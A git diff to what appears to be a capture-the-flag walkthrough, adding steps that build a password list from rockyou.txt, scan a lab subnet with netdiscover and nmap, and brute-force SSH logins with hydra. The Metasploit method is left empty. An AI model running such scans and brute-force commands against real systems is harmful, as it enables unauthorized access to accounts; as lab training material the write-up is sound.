@@ -253,15 +253,15 @@ We will need to install the `rockyou.txt` password file for this, so if you don'
 
 Next you need to extract the `rockyou.txt` file, run `sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`
 
-With that done we can now generate our password file.
+With that done we can now generate our `password.txt` file.
 
 Run `cat /usr/share/wordlists/rockyou.txt | grep -e '^P' | grep -e '[1][2][3]$' >> passwords.txt`
 
 Basically what the above command is doing is outputting all enteries in the rockyou.txt file that start with an uppercase `P` and end in `123` to a new file called `passwords.txt`
 
-Next we need a user name list, a quick Google search for `top 10 most common usernames linux` leads us <a href="https://yurisk.info/2010/06/04/top-10-usernames-used-in-ssh-brute-force/">here</a>
+Next we need a `users.txt` list, a quick Google search for `top 10 most common usernames linux` leads us <a href="https://yurisk.info/2010/06/04/top-10-usernames-used-in-ssh-brute-force/">here</a>
 
-Let's create a `user.txt` file with the below usernames.
+Let's create a `users.txt` file with the below usernames.
 
 As we can see the hostname on the login screen we will add that, as it is very common in CTF's to use the hostname as the username.
 
@@ -283,14 +283,43 @@ Now let's get stuck in and get access to this system. 👻
 
 We have a number of methods available to us to gain access to this VM.
 
-**Method 1:**
+**Method 1 - Hydra:**
+Furst we need the IP address of the target system.
+
+Run `netdiscover` to list active IP address on the subnet - change the subnet range in the command to suit your environment.
+
+```bash
+sudo netdiscover -r 10.10.2.0/24 
+```
+
+We now have the IP address of our target system.
+
+![Screenshot 2022-12-15 150938](https://user-images.githubusercontent.com/117080369/207896234-f0621480-79da-4283-90c0-f67c74510a83.png)
+
+Next we will run `Nmap` to see if there are any open ports we can abuse.
+
+```bash
+nmap -sC -sV 10.0.2.5
+```
+Our `Nmap` scan confirms SSH is open - although there is no guarentee it is configured.
+
+![Screenshot 2022-12-15 151346](https://user-images.githubusercontent.com/117080369/207897284-b969fb20-c749-4f74-9af7-d153b9d465fa.png)
+
+Let's see if we can bruteforce our way in via SSH.
+
+```bash
+hydra -F -L ~/.users.txt -P ~/passwords.txt -vV 10.0.2.5 ssh -t 4
+```
+
+After a very short time Hydra gets a hit!
+
+![Screenshot 2022-12-15 151908](https://user-images.githubusercontent.com/117080369/207898427-712cecb0-9c78-453e-9787-f13060811087.png)
+
+**Method 2 - Metasploit:**
 
 
-**Method 2:**
-
-
-**Method 3:**
-
+**Method 3 - Manual:**
+Make an assumption about the password and just try each combination manually until you maybe get lucky.
 
 
 ### Step 09:
